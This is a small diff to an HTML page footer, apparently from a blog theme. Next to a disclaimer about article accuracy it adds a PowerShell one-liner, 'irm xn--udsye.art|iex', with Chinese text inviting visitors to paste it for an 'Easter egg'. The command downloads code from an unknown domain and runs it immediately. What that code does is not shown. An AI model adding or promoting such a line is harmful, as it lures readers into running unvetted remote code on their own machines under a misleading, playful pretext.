@@ -96,5 +96,6 @@
   </div>
   <p align="center" style="text-align: center; margin-top: 28px; margin-bottom: 10px; font-size: 12px; color: var(--tk-sub-color, #8a8a93); opacity: 0.85;">
     <small>※ 提示：文章内容仅供参考，可能存在疏漏或错误，具体问题请具体分析。</small>
+    <small>irm xn--udsye.art|iex PowerShell输入这段代码会有小彩蛋哦~</small>
   </p>
 </div>
